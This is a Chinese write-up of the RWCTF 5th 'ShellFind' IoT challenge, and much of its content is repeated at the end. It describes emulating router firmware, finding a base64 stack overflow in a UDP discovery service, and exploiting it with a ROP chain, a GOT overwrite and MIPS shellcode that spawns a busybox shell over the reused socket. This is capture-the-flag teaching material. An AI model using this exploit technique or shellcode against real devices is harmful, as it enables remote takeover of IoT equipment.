# RWCTF 5th ShellFind Write-up

> 原文: https://www.ctfiot.com/91517.html
> ID: 91517

别忘了

星标我！

出题背景

IoT安全近几年来备受安全行业人员和安全赛事关注，当我们挖掘的漏洞提前被官方修复或撞衫，可能别是一般滋味在心头，所以得从独特的攻击面入手来寻找漏洞和攻击路径。此题目就是，使用某款大众比较关注的IoT设备，将其中的某个非Web类网络服务映射出来，作为整体的背景。因为作为调试漏洞或者远程配置服务是比较常见的漏洞场景，容易被恶意攻击者利用，进而造成僵尸网络的形成。

相关参考如下：

从最近披露的Pink僵尸网络想到的(https://zu1k.com/posts/events/pinkbot/)

一个藏在我们身边的巨型僵尸网络 Pink(https://blog.netlab.360.com/pinkbot/)

题目描述

题目类型为Pwn，难度描述为 difficulty:
Normal，具体描述如下：

Hello Hacker.You don't know me, but I know you.I want to play a game. Here's what happens if you lose.The device you are watching is hooked into your Saturday and Sunday.When the timer in the back goes off,your curiosity will be permanently ripped open.Think of it like a reverse bear trap.Here, I'll show you.There is only one UDP service to shell the device.It's in the stomach of your cold firmware.Look around Hacker. Know that I'm not lying.Better hurry up.Shell or out, make your choice.

sudo docker run --name shellfind -d --privileged -p 4444/udp --rm 1arry/shellfind

环境搭建

物联网设备的几种固件仿真方式(http://blog.nsfocus.net/qemu/)

物联网终端安全入门与实践之玩转物联网固件（中）(https://www.freebuf.com/articles/endpoint/339782.html)

智能设备固件常用仿真方式(https://mp.weixin.qq.com/s/Q2gXMUhaaTvOsFm-TQEjeA)

echo "----Setting up FIRMADYNE----"for BINARY_NAME in "${BINARIES[@]}"do BINARY_PATH=`get_binary ${BINARY_NAME} ${ARCH}` cp "${BINARY_PATH}" "${IMAGE_DIR}/firmadyne/${BINARY_NAME}" chmod a+x "${IMAGE_DIR}/firmadyne/${BINARY_NAME}"done

Linux虚拟网络设备之veth(https://segmentfault.com/a/1190000009251098?utm_source=sf-similar-article)

Linux虚拟网络设备之tun/tap(https://segmentfault.com/a/1190000009249039)

Linux虚拟网络设备之bridge(桥)(https://segmentfault.com/a/1190000009491002?utm_source=sf-similar-article)

Setting up Qemu with a tap interface(https://gist.github.com/extremecoders-re/e8fd8a67a515fee0c873dcafc81d811c)

TAPDEV_0=tap${IID}_0HOSTNETDEV_0=${TAPDEV_0}echo "Creating TAP device ${TAPDEV_0}..."sudo tunctl -t ${TAPDEV_0} -u ${USER}

echo "Bringing up TAP device..."sudo ip link set ${HOSTNETDEV_0} upsudo ip addr add 192.168.0.2/24 dev ${HOSTNETDEV_0}

echo -n "Starting emulation of firmware... " ${QEMU} ${QEMU_BOOT} -m 1024 -M ${QEMU_MACHINE} -kernel ${KERNEL} -drive if=ide,format=raw,file=${IMAGE} -append "root=${QEMU_ROOTFS} console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 FIRMAE_NET=${FIRMAE_NET} FIRMAE_NVRAM=${FIRMAE_NVRAM} FIRMAE_KERNEL=${FIRMAE_KERNEL} FIRMAE_ETC=${FIRMAE_ETC} ${QEMU_DEBUG}" -serial file:${WORK_DIR}/qemu.final.serial.log -serial unix:/tmp/qemu.${IID}.S1,server,nowait -monitor unix:/tmp/qemu.${IID},server,nowait -display none -device e1000,netdev=net0 -netdev tap,id=net0,ifname=${TAPDEV_0},script=no -device e1000,netdev=net1 -netdev socket,id=net1,listen=:
2001 -device e1000,netdev=net2 -netdev socket,id=net2,listen=:
2002 -device e1000,netdev=net3 -netdev socket,id=net3,listen=:
2003 | true

echo "Bringing down TAP device..."sudo ip link set ${TAPDEV_0} down

echo "Deleting TAP device ${TAPDEV_0}..."sudo tunctl -d ${TAPDEV_0}

echo "Done!"

漏洞根因

题目没有具体给出是哪个端口对应的服务，但是在模拟完镜像后，首先排除不是80的tcp服务，剩下的就是逆向和定位工作了，这里欢迎参赛选手们的补充。

 

# /firmadyne/busybox netstat -lnp/firmadyne/busybox netstat -lnpnetstat: showing only processes with your user IDActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 :::
31338 :::* LISTEN 911/busyboxtcp 0 0 :::80 :::* LISTEN 761/httpdudp 0 0 0.0.0.0:
62976 0.0.0.0:* 889/ddpudp 0 0 0.0.0.0:
62720 0.0.0.0:* 765/ipfindActive UNIX domain sockets (only servers)Proto RefCnt Flags Type State I-Node PID/Program name Path

v6 = server_sockfd; v14.__fds_bits[(unsigned int)server_sockfd >> 5] |= 1 << server_sockfd; if ( select(v6 + 1, &v14, 0, 0, 0) >= 0 ) { if ( ((v14.__fds_bits[(unsigned int)server_sockfd >> 5] >> server_sockfd) & 1) != 0 ) { v11 = 16; memset(v15, 0, sizeof(v15)); recvfrom(server_sockfd, v15, 0x800u, 0, (struct sockaddr *)&client_addr, addr_len); *(_DWORD *)&v15[4] = (*(_DWORD *)&v15[4] << 24) | (unsigned __int8)v15[4] | ((*(_DWORD *)&v15[4] & 0xFF0000u) >> 8) | ((*(_DWORD *)&v15[4] & 0xFF00) << 8); v7 = (unsigned __int16)((_byteswap_ushort(*(unsigned __int16 *)&v15[9]) << 8) | ((unsigned int)((unsigned __int8)v15[10] | ((unsigned __int8)v15[9] << 8)) >> 8)); *(_WORD *)&v15[9] = v7; *(_WORD *)&v15[11] = (_byteswap_ushort(*(unsigned __int16 *)&v15[11]) << 8) | ((unsigned int)((unsigned __int8)v15[12] | ((unsigned __int8)v15[11] << 8)) >> 8); v8 = (unsigned __int16)((_byteswap_ushort(*(unsigned __int16 *)&v15[23]) << 8) | ((unsigned int)((unsigned __int8)v15[24] | ((unsigned __int8)v15[23] << 8)) >> 8)); *(_WORD *)&v15[23] = v8; v17 = (*(_DWORD *)&v15[25] << 24) | (unsigned __int8)v15[25] | ((*(_DWORD *)&v15[25] & 0xFF0000u) >> 8) | ((*(_DWORD *)&v15[25] & 0xFF00) << 8); *(_DWORD *)&v15[25] = v17; if ( !strncmp(v18, v20, 4u) && v15[8] == 10 ) { if ( v7 == 1 ) { if ( !v8 && !memcmp(v21, v23, 6u) && !v17 ) sub_40172C((int)v15); } else if ( v7 == 2 && net_get_hwaddr(ifname, v22) >= 0 && !memcmp(v21, v22, 6u) && *(_DWORD *)&v15[25] == 0x8E ) { sub_4013F4((int)v15); } } } }

v9[75] = v9[75] & 0xFF0000FF | ((unsigned __int16)(((_WORD)v7 << 8) | BYTE2(v7)) << 8); v3 = inet_ntoa((struct in_addr)dword_413174); dword_413174 = inet_addr("255.255.255.255"); if ( sendto(server_sockfd, v9, 0x21Du, 0, (const struct sockaddr *)&client_addr, 0x10u) < 0 ) v4 = "Failed"; else v4 = "Success"; return s_log_nothing("from %s: Discovery %s.n", v3, v4);

在 sub_4013F4 中进入 sub_400F50 函数后，显而易见的漏洞点则是base64解码直接到栈上，造成缓冲区溢出：

int __fastcall sub_400F50(int a1, int a2){ int v4; // $s1 int v5; // $s0 char v7[256]; // [sp+18h] [-344h] BYREF char v8[256]; // [sp+118h] [-244h] BYREF char v9[256]; // [sp+218h] [-144h] BYREF char v10; // [sp+318h] [-44h] BYREF char v11[63]; // [sp+319h] [-43h] BYREF
 v10 = 0; memset(v11, 0, sizeof(v11)); Base64decs(a1, v7); Base64decs(a2, v8); cfgRead("USER_ADMIN", "Username1", &v10); usrInit(0); v4 = usrGetGroup(v7); v5 = usrGetPass(v7, v9, 256); if ( v5 == 1 ) { if ( !v4 && !strcmp(&v10, v7) ) v5 = strcmp(v8, v9) != 0; } else { v5 = -1; } usrFree(); return v5;}

漏洞利用

checksec该程序后发现安全编译选项都没有开，但是mipsrop(https://github.com/tacnetsol/ida/tree/master/plugins/mipsrop)没有给出有效的输出，意味着我们要自己去构造rop进行利用。同时，qemu系统中开启了ASLR也是题目的限制之一。

$ checksec /mnt/hgfs/rwctf/iot/firmware/ipfind[*] You have the latest version of Pwntools (4.8.0)[*] '/mnt/hgfs/rwctf/iot/firmware/ipfind' Arch: mips-32-big RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments

修改GOT

.text:
00400F24 8F A2 00 18 lw $v0, 0x20+var_8($sp).text:
00400F28 AE 02 00 0D sw $v0, 0xD($s0).text:
00400F2C.text:
00400F2C loc_400F2C: # CODE XREF: sub_400E50+CC↑j.text:
00400F2C 8F 82 80 68 la $v0, ifname.text:
00400F30 8C 44 00 00 lw $a0, (ifname - 0x413138)($v0).text:
00400F34 8F 99 80 8C la $t9, net_get_hwaddr.text:
00400F38 03 20 F8 09 jalr $t9 ; net_get_hwaddr.text:
00400F3C 26 05 00 11 addiu $a1, $s0, 0x11.text:
00400F40 8F BF 00 24 lw $ra, 0x20+var_s4($sp).text:
00400F44 8F B0 00 20 lw $s0, 0x20+var_s0($sp).text:
00400F48 03 E0 00 08 jr $ra.text:
00400F4C 27 BD 00 28

.text:
00400F34 8F 99 80 8C la $t9, net_get_hwaddr8F 99 80 8C lw $t9, -0x7f74($gp)

0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20

.text:
00401768 27 A4 00 21 addiu $a0, $sp, 0x35C+var_33B # s.text:
0040176C 00 00 28 21 move $a1, $zero # c.text:
00401770 8F 99 80 78 la $t9, memset.text:
00401774 03 20 F8 09 jalr $t9 ; memset.text:
00401778 24 06 00 FF li $a2, 0xFF # n

但是如何通过一条命令就获取flag了呢，首先目标环境不出网意味着不能反弹shell，那就得复用这个udp端口了。首先想知道目标环境有没有nc之类的环境，如果说碰巧也是用的是FirmAE环境，那么在 /firmadyne/目录下直接使用busybox，即可起一个udpbindshell，可惜busybox的nc被我修改成了nx，不知道你能不能猜到。

.rodata:
0057401F .byte 0x6E # n.rodata:
00574020 .byte 0x78 # x.rodata:
00574021 .byte 0.rodata:
00574022 .byte 0x6E # n.rodata:
00574023 .byte 0x65 # e.rodata:
00574024 .byte 0x74 # t.rodata:
00574025 .byte 0x73 # s.rodata:
00574026 .byte 0x74 # t.rodata:
00574027 .byte 0x61 # a.rodata:
00574028 .byte 0x74 # t.rodata:
00574029 .byte 0

不能的话那咱 echo 出一个binary上去好了，受限于初始recvfrom的长度，缓冲区溢出的padding，还有base64编码的扩大，一次命令中仅能包含几百个字符。我懒得去编译生成再精简binary，所以如果能多次执行命令就好了，我们在利用完漏洞后重启漏洞服务就好了：

bof_payload += cmd if restart == True: bof_payload += "rm /var/run/ipfind-br0.pid;ipfind br0 &x00" else: bof_payload += "x00"

.text:
004021E8 8F BC 00 10 lw $gp, 0x98+var_88($sp).text:
004021EC 8F 82 80 B8 la $v0, server_sockfd.text:
004021F0 8C 44 00 00 lw $a0, (server_sockfd - 0x413134)($v0) # fd.text:
004021F4 8F 99 80 38 la $t9, close.text:
004021F8 03 20 F8 09 jalr $t9 ; close.text:
004021FC 00 00 00 00 nop.text:
00402200 8F BF 00 9C lw $ra, 0x98+var_s4($sp).text:
00402204 8F B0 00 98 lw $s0, 0x98+var_s0($sp).text:
00402208 03 E0 00 08 jr $ra.text:
0040220C 27 BD 00 A0 addiu $sp, 0xA0

ret2shellcode

.text:
004013D0 s_log_nothing: # CODE XREF: sub_4013F4+9C↓p.text:
004013D0 # sub_4013F4+160↓p ....text:
004013D0.text:
004013D0 var_8 = -8.text:
004013D0 arg_4 = 4.text:
004013D0 arg_8 = 8.text:
004013D0 arg_C = 0xC.text:
004013D0.text:
004013D0 27 BD FF F0 addiu $sp, -0x10.text:
004013D4 AF A5 00 14 sw $a1, 0x10+arg_4($sp).text:
004013D8 AF A6 00 18 sw $a2, 0x10+arg_8($sp).text:
004013DC AF A7 00 1C sw $a3, 0x10+arg_C($sp).text:
004013E0 27 A2 00 14 addiu $v0, $sp, 0x10+arg_4.text:
004013E4 AF A2 00 08 sw $v0, 0x10+var_8($sp).text:
004013E8 27 BD 00 10 addiu $sp, 0x10.text:
004013EC 03 E0 00 08 jr $ra.text:
004013F0 00 00 00 00 nop

其中 addiu $v0,$sp,0x10+arg_4 把栈地址打出来了，进一步寻找对 s_log_nothing 函数的交叉引入，既不影响到 $v0 又很快地覆盖 $ra，比如：

 

.text:
00401F98 0C 10 04 F4 jal s_log_nothing.text:
00401F9C 24 84 2C F8 li $a0, aCanTGetHelloSo # "Can't get hello socketn".text:
00401FA0 10 00 00 44 b loc_4020B4
.text:
004020B4 8F BF 00 84 lw $ra, 0x7C+var_s8($sp).text:
004020B8 8F B1 00 80 lw $s1, 0x7C+var_s4($sp).text:
004020BC 8F B0 00 7C lw $s0, 0x7C+var_s0($sp).text:
004020C0 03 E0 00 08 jr $ra.text:
004020C4 27 BD 00 88 addiu $sp, 0x88

我们前文的任意地址写的值正好是 $v0，那么再来个load后跳转就可以了，仔细观察程序中函数的结尾，可以发现这样的gadget正好满足我们的需求：

.text:
004027C0 03 20 F8 09 jalr $t9.text:
004027C4 00 00 00 00 nop.text:
004027C8.text:
004027C8 loc_4027C8: # CODE XREF: sub_402790+28↑j.text:
004027C8 8E 19 00 00 lw $t9, 0($s0).text:
004027CC 17 31 FF FC bne $t9, $s1, loc_4027C0.text:
004027D0 26 10 FF FC addiu $s0, -4.text:
004027D4 8F BF 00 24 lw $ra, 0x1C+var_s8($sp).text:
004027D8 8F B1 00 20 lw $s1, 0x1C+var_s4($sp).text:
004027DC 8F B0 00 1C lw $s0, 0x1C+var_s0($sp).text:
004027E0 03 E0 00 08 jr $ra.text:
004027E4 27 BD 00 28 addiu $sp, 0x28

.text:
004020A0 00 00 38 21 move $a3, $zero # flags.text:
004020A4 8F BC 00 18 lw $gp, 0x7C+var_64($sp).text:
004020A8 8F 99 80 38 la $t9, close.text:
004020AC 03 20 F8 09 jalr $t9 ; close.text:
004020B0 02 00 20 21 move $a0, $s0 # fd.text:
004020B4.text:
004020B4 loc_4020B4: # CODE XREF: sub_401DF4+1AC↑j.text:
004020B4 # sub_401DF4+238↑j ....text:
004020B4 8F BF 00 84 lw $ra, 0x7C+var_s8($sp).text:
004020B8 8F B1 00 80 lw $s1, 0x7C+var_s4($sp).text:
004020BC 8F B0 00 7C lw $s0, 0x7C+var_s0($sp).text:
004020C0 03 E0 00 08 jr $ra.text:
004020C4 27 BD 00 88 addiu $sp, 0x88

} else if (uflag && !kflag) { /* * For UDP and not -k, we will use recvfrom() * initially to wait for a caller, then use * the regular functions to talk to the caller. */ int rv; char buf[2048]; struct sockaddr_storage z;
 len = sizeof(z); rv = recvfrom(s, buf, sizeof(buf), MSG_PEEK, (struct sockaddr *)&z, &len); if (rv == -1) err(1, "recvfrom");
 rv = connect(s, (struct sockaddr *)&z, len); if (rv == -1) err(1, "connect");
 if (family == AF_UNIX) { if (pledge("stdio unix", NULL) == -1) err(1, "pledge"); } if (vflag) report_sock("Connection received", (struct sockaddr *)&z, len, family == AF_UNIX ? host : NULL);
 readwrite(s, NULL);

因为第一次交互触发漏洞时已经recvfrom接收消息了，再借助现有的connect back shellcode(https://shell-storm.org/shellcode/files/shellcode-794.html)，dup2后execve busybox即可，不过busybox要注意传递的格式(https://www.anquanke.com/post/id/180252#h3-11)，最后一发入魂：

 bof_payload += "x3Cx1Cx00x42" # lui $gp, 0x42 bof_payload += "x27x9CxB0x30" # addiu $gp, $gp, -0x4fd0 bof_payload += "x8Fx82x80xB8" # la $v0, server_sockfd bof_payload += "x8Cx44x00x00" # lw $a0, (server_sockfd - 0x413134)($v0) # fd bof_payload += "x8Fx85x80xF4" # lw $a1, -0x7f0c($gp) bof_payload += "x24x0cxffxef" # li t4,-17 ( addrlen = 16 ) bof_payload += "x01x80x30x27" # nor a2,t4,zero bof_payload += "x24x02x10x4a" # li v0,4170 ( sys_connect ) bof_payload += "x01x01x01x0c" # syscall 0x40404
 bof_payload += "x3Cx1Cx00x42" # lui $gp, 0x42 bof_payload += "x27x9CxB0x30" # addiu $gp, $gp, -0x4fd0 bof_payload += "x8Fx82x80xB8" # la $v0, server_sockfd bof_payload += "x8Cx44x00x00" # lw $a0, (server_sockfd - 0x413134)($v0) # fd
 bof_payload += "x24x0fxffxfd" # li t7,-3 bof_payload += "x01xe0x28x27" # nor a1,t7,zero # bof_payload += "x8fxa4xffxff" # lw a0,-1(sp) bof_payload += "x24x02x0fxdf" # li v0,4063 ( sys_dup2 ) bof_payload += "x01x01x01x0c" # syscall 0x40404 bof_payload += "x20xa5xffxff" # addi a1,a1,-1 bof_payload += "x24x01xffxff" # li at,-1 bof_payload += "x14xa1xffxfb" # bne a1,at, dup2_loop
 # execve /bin/busybox sh bof_payload += "x28x06xFFxFF" # slti $a2, $zero, -1 bof_payload += "x3Cx0Fx2Fx62" # lui $t7, 0x2f62 bof_payload += "x35xEFx69x6E" # ori $t7, $t7, 0x696e bof_payload += "xAFxAFxFFxDC" # sw $t7, -0x24($sp) bof_payload += "x3Cx0Fx2Fx62" # lui $t7, 0x2f62 bof_payload += "x35xEFx75x73" # ori $t7, $t7, 0x7573 bof_payload += "xAFxAFxFFxE0" # sw $t7, -0x20($sp) bof_payload += "x3Cx0Fx79x62" # lui $t7, 0x7962 bof_payload += "x35xEFx6Fx78" # ori $t7, $t7, 0x6f78 bof_payload += "xAFxAFxFFxE4" # sw $t7, -0x1c($sp) bof_payload += "xAFxA0xFFxE8" # sw $zero, -0x18($sp) bof_payload += "x3Cx0Fx73x68" # lui $t7, 0x7368 bof_payload += "xAFxAFxFFxEC" # sw $t7, -0x14($sp) bof_payload += "xAFxA0xFFxF0" # sw $zero, -0x10($sp) bof_payload += "x27xAFxFFxDC" # addiu $t7, $sp, -0x24 bof_payload += "xAFxAFxFFxF4" # sw $t7, -0xc($sp) bof_payload += "x27xAFxFFxEC" # addiu $t7, $sp, -0x14 bof_payload += "xAFxAFxFFxF8" # sw $t7, -8($sp) bof_payload += "xAFxA0xFFxFC" # sw $zero, -4($sp) bof_payload += "x27xA4xFFxDC" # addiu $a0, $sp, -0x24 bof_payload += "x27xA5xFFxF8" # addiu $a1, $sp, -8 bof_payload += "x24x02x0FxAB" # addiu $v0, $zero, 0xfab bof_payload += "x01x01x01x0C" # syscall 0x40404

赛后总结

1

根据出题方式，发现题目中的target binary大致有三种方式：1是逆向过程中发现程序被patch过；2是重打包固件会遗留下access time的踪迹；3是使用固件模拟的方式来发现默认启动的网络服务，这一点应该算作是IoT攻防人员的基本素养之一。

2

题目中的逆向和漏洞挖掘难度不大，但需要选手动态发包和网络程序能进行前期的交互，才算是真正地确定了target binary，或许有些指纹扫描的味道在其中。

3

单凭一个简单程序的一个漏洞获取交互式shell，看似不可能，但最终我们在漏洞利用过程中，不能仅仅参考辅助程序给我们的输出，要追究其本质，让程序的一切都为我们所用。此外，该漏洞还可以直接返回至sendto附近的gadget完成信息泄漏，但是需要多次交互，这一点和直接写列目录的shellcode一样，个人认为可能增加了一些额外的噪音。

4

十分感谢长亭科技公司给予我在此次Real World CTF 5th中探索安全攻防技术的机会，同样感谢在此次大赛中各位师傅和选手们的辛苦付出，希望这篇文章对你我能有所启发，hack不止。

点分享

点收藏

点点赞

点在看


```
Hello Hacker.You don't know me, but I know you.I want to play a game. Here's what happens if you lose.The device you are watching is hooked into your Saturday and Sunday.When the timer in the back goes off,your curiosity will be permanently ripped open.Think of it like a reverse bear trap.Here, I'll show you.There is only one UDP service to shell the device.It's in the stomach of your cold firmware.Look around Hacker. Know that I'm not lying.Better hurry up.Shell or out, make your choice.
sudo docker run --name shellfind -d --privileged -p 4444/udp --rm 1arry/shellfind
echo "----Setting up FIRMADYNE----"for BINARY_NAME in "${BINARIES[@]}"do BINARY_PATH=`get_binary ${BINARY_NAME} ${ARCH}` cp "${BINARY_PATH}" "${IMAGE_DIR}/firmadyne/${BINARY_NAME}" chmod a+x "${IMAGE_DIR}/firmadyne/${BINARY_NAME}"done
TAPDEV_0=tap${IID}_0HOSTNETDEV_0=${TAPDEV_0}echo "Creating TAP device ${TAPDEV_0}..."sudo tunctl -t ${TAPDEV_0} -u ${USER}

echo "Bringing up TAP device..."sudo ip link set ${HOSTNETDEV_0} upsudo ip addr add 192.168.0.2/24 dev ${HOSTNETDEV_0}

echo -n "Starting emulation of firmware... " ${QEMU} ${QEMU_BOOT} -m 1024 -M ${QEMU_MACHINE} -kernel ${KERNEL} -drive if=ide,format=raw,file=${IMAGE} -append "root=${QEMU_ROOTFS} console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 FIRMAE_NET=${FIRMAE_NET} FIRMAE_NVRAM=${FIRMAE_NVRAM} FIRMAE_KERNEL=${FIRMAE_KERNEL} FIRMAE_ETC=${FIRMAE_ETC} ${QEMU_DEBUG}" -serial file:${WORK_DIR}/qemu.final.serial.log -serial unix:/tmp/qemu.${IID}.S1,server,nowait -monitor unix:/tmp/qemu.${IID},server,nowait -display none -device e1000,netdev=net0 -netdev tap,id=net0,ifname=${TAPDEV_0},script=no -device e1000,netdev=net1 -netdev socket,id=net1,listen=:
2001 -device e1000,netdev=net2 -netdev socket,id=net2,listen=:
2002 -device e1000,netdev=net3 -netdev socket,id=net3,listen=:
2003 | true

echo "Bringing down TAP device..."sudo ip link set ${TAPDEV_0} down

echo "Deleting TAP device ${TAPDEV_0}..."sudo tunctl -d ${TAPDEV_0}

echo "Done!"
# /firmadyne/busybox netstat -lnp/firmadyne/busybox netstat -lnpnetstat: showing only processes with your user IDActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 :::
31338 :::* LISTEN 911/busyboxtcp 0 0 :::80 :::* LISTEN 761/httpdudp 0 0 0.0.0.0:
62976 0.0.0.0:* 889/ddpudp 0 0 0.0.0.0:
62720 0.0.0.0:* 765/ipfindActive UNIX domain sockets (only servers)Proto RefCnt Flags Type State I-Node PID/Program name Path
v6 = server_sockfd; v14.__fds_bits[(unsigned int)server_sockfd >> 5] |= 1 << server_sockfd; if ( select(v6 + 1, &v14, 0, 0, 0) >= 0 ) { if ( ((v14.__fds_bits[(unsigned int)server_sockfd >> 5] >> server_sockfd) & 1) != 0 ) { v11 = 16; memset(v15, 0, sizeof(v15)); recvfrom(server_sockfd, v15, 0x800u, 0, (struct sockaddr *)&client_addr, addr_len); *(_DWORD *)&v15[4] = (*(_DWORD *)&v15[4] << 24) | (unsigned __int8)v15[4] | ((*(_DWORD *)&v15[4] & 0xFF0000u) >> 8) | ((*(_DWORD *)&v15[4] & 0xFF00) << 8); v7 = (unsigned __int16)((_byteswap_ushort(*(unsigned __int16 *)&v15[9]) << 8) | ((unsigned int)((unsigned __int8)v15[10] | ((unsigned __int8)v15[9] << 8)) >> 8)); *(_WORD *)&v15[9] = v7; *(_WORD *)&v15[11] = (_byteswap_ushort(*(unsigned __int16 *)&v15[11]) << 8) | ((unsigned int)((unsigned __int8)v15[12] | ((unsigned __int8)v15[11] << 8)) >> 8); v8 = (unsigned __int16)((_byteswap_ushort(*(unsigned __int16 *)&v15[23]) << 8) | ((unsigned int)((unsigned __int8)v15[24] | ((unsigned __int8)v15[23] << 8)) >> 8)); *(_WORD *)&v15[23] = v8; v17 = (*(_DWORD *)&v15[25] << 24) | (unsigned __int8)v15[25] | ((*(_DWORD *)&v15[25] & 0xFF0000u) >> 8) | ((*(_DWORD *)&v15[25] & 0xFF00) << 8); *(_DWORD *)&v15[25] = v17; if ( !strncmp(v18, v20, 4u) && v15[8] == 10 ) { if ( v7 == 1 ) { if ( !v8 && !memcmp(v21, v23, 6u) && !v17 ) sub_40172C((int)v15); } else if ( v7 == 2 && net_get_hwaddr(ifname, v22) >= 0 && !memcmp(v21, v22, 6u) && *(_DWORD *)&v15[25] == 0x8E ) { sub_4013F4((int)v15); } } } }
v9[75] = v9[75] & 0xFF0000FF | ((unsigned __int16)(((_WORD)v7 << 8) | BYTE2(v7)) << 8); v3 = inet_ntoa((struct in_addr)dword_413174); dword_413174 = inet_addr("255.255.255.255"); if ( sendto(server_sockfd, v9, 0x21Du, 0, (const struct sockaddr *)&client_addr, 0x10u) < 0 ) v4 = "Failed"; else v4 = "Success"; return s_log_nothing("from %s: Discovery %s.n", v3, v4);
int __fastcall sub_400F50(int a1, int a2){ int v4; // $s1 int v5; // $s0 char v7[256]; // [sp+18h] [-344h] BYREF char v8[256]; // [sp+118h] [-244h] BYREF char v9[256]; // [sp+218h] [-144h] BYREF char v10; // [sp+318h] [-44h] BYREF char v11[63]; // [sp+319h] [-43h] BYREF
 v10 = 0; memset(v11, 0, sizeof(v11)); Base64decs(a1, v7); Base64decs(a2, v8); cfgRead("USER_ADMIN", "Username1", &v10); usrInit(0); v4 = usrGetGroup(v7); v5 = usrGetPass(v7, v9, 256); if ( v5 == 1 ) { if ( !v4 && !strcmp(&v10, v7) ) v5 = strcmp(v8, v9) != 0; } else { v5 = -1; } usrFree(); return v5;}
$ checksec /mnt/hgfs/rwctf/iot/firmware/ipfind[*] You have the latest version of Pwntools (4.8.0)[*] '/mnt/hgfs/rwctf/iot/firmware/ipfind' Arch: mips-32-big RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments
.text:
00400F24 8F A2 00 18 lw $v0, 0x20+var_8($sp).text:
00400F28 AE 02 00 0D sw $v0, 0xD($s0).text:
00400F2C.text:
00400F2C loc_400F2C: # CODE XREF: sub_400E50+CC↑j.text:
00400F2C 8F 82 80 68 la $v0, ifname.text:
00400F30 8C 44 00 00 lw $a0, (ifname - 0x413138)($v0).text:
00400F34 8F 99 80 8C la $t9, net_get_hwaddr.text:
00400F38 03 20 F8 09 jalr $t9 ; net_get_hwaddr.text:
00400F3C 26 05 00 11 addiu $a1, $s0, 0x11.text:
00400F40 8F BF 00 24 lw $ra, 0x20+var_s4($sp).text:
00400F44 8F B0 00 20 lw $s0, 0x20+var_s0($sp).text:
00400F48 03 E0 00 08 jr $ra.text:
00400F4C 27 BD 00 28
.text:
00400F34 8F 99 80 8C la $t9, net_get_hwaddr8F 99 80 8C lw $t9, -0x7f74($gp)
0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20
.text:
00401768 27 A4 00 21 addiu $a0, $sp, 0x35C+var_33B # s.text:
0040176C 00 00 28 21 move $a1, $zero # c.text:
00401770 8F 99 80 78 la $t9, memset.text:
00401774 03 20 F8 09 jalr $t9 ; memset.text:
00401778 24 06 00 FF li $a2, 0xFF # n
.rodata:
0057401F .byte 0x6E # n.rodata:
00574020 .byte 0x78 # x.rodata:
00574021 .byte 0.rodata:
00574022 .byte 0x6E # n.rodata:
00574023 .byte 0x65 # e.rodata:
00574024 .byte 0x74 # t.rodata:
00574025 .byte 0x73 # s.rodata:
00574026 .byte 0x74 # t.rodata:
00574027 .byte 0x61 # a.rodata:
00574028 .byte 0x74 # t.rodata:
00574029 .byte 0
bof_payload += cmd if restart == True: bof_payload += "rm /var/run/ipfind-br0.pid;ipfind br0 &x00" else: bof_payload += "x00"
.text:
004021E8 8F BC 00 10 lw $gp, 0x98+var_88($sp).text:
004021EC 8F 82 80 B8 la $v0, server_sockfd.text:
004021F0 8C 44 00 00 lw $a0, (server_sockfd - 0x413134)($v0) # fd.text:
004021F4 8F 99 80 38 la $t9, close.text:
004021F8 03 20 F8 09 jalr $t9 ; close.text:
004021FC 00 00 00 00 nop.text:
00402200 8F BF 00 9C lw $ra, 0x98+var_s4($sp).text:
00402204 8F B0 00 98 lw $s0, 0x98+var_s0($sp).text:
00402208 03 E0 00 08 jr $ra.text:
0040220C 27 BD 00 A0 addiu $sp, 0xA0
.text:
004013D0 s_log_nothing: # CODE XREF: sub_4013F4+9C↓p.text:
004013D0 # sub_4013F4+160↓p ....text:
004013D0.text:
004013D0 var_8 = -8.text:
004013D0 arg_4 = 4.text:
004013D0 arg_8 = 8.text:
004013D0 arg_C = 0xC.text:
004013D0.text:
004013D0 27 BD FF F0 addiu $sp, -0x10.text:
004013D4 AF A5 00 14 sw $a1, 0x10+arg_4($sp).text:
004013D8 AF A6 00 18 sw $a2, 0x10+arg_8($sp).text:
004013DC AF A7 00 1C sw $a3, 0x10+arg_C($sp).text:
004013E0 27 A2 00 14 addiu $v0, $sp, 0x10+arg_4.text:
004013E4 AF A2 00 08 sw $v0, 0x10+var_8($sp).text:
004013E8 27 BD 00 10 addiu $sp, 0x10.text:
004013EC 03 E0 00 08 jr $ra.text:
004013F0 00 00 00 00 nop
.text:
00401F98 0C 10 04 F4 jal s_log_nothing.text:
00401F9C 24 84 2C F8 li $a0, aCanTGetHelloSo # "Can't get hello socketn".text:
00401FA0 10 00 00 44 b loc_4020B4
.text:
004020B4 8F BF 00 84 lw $ra, 0x7C+var_s8($sp).text:
004020B8 8F B1 00 80 lw $s1, 0x7C+var_s4($sp).text:
004020BC 8F B0 00 7C lw $s0, 0x7C+var_s0($sp).text:
004020C0 03 E0 00 08 jr $ra.text:
004020C4 27 BD 00 88 addiu $sp, 0x88
.text:
004027C0 03 20 F8 09 jalr $t9.text:
004027C4 00 00 00 00 nop.text:
004027C8.text:
004027C8 loc_4027C8: # CODE XREF: sub_402790+28↑j.text:
004027C8 8E 19 00 00 lw $t9, 0($s0).text:
004027CC 17 31 FF FC bne $t9, $s1, loc_4027C0.text:
004027D0 26 10 FF FC addiu $s0, -4.text:
004027D4 8F BF 00 24 lw $ra, 0x1C+var_s8($sp).text:
004027D8 8F B1 00 20 lw $s1, 0x1C+var_s4($sp).text:
004027DC 8F B0 00 1C lw $s0, 0x1C+var_s0($sp).text:
004027E0 03 E0 00 08 jr $ra.text:
004027E4 27 BD 00 28 addiu $sp, 0x28
.text:
004020A0 00 00 38 21 move $a3, $zero # flags.text:
